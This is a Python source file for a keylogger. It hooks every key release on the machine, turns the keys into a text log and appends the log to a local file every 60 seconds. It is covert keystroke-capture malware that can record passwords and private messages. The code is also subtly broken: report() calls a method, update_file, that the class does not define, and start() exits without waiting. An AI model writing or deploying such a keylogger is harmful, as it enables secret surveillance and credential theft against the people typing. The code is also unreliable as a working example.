import keyboard
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.filename = "log"   #here filename

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        self.log = f"keylog-{start_dt_str} " + self.log

    def report_to_file(self):
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "a") as f:    
            # write the keylogs to the file
            print(self.log, file=f)

        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        if self.log:
            self.update_file()
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        #keyboard.wait('|')


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()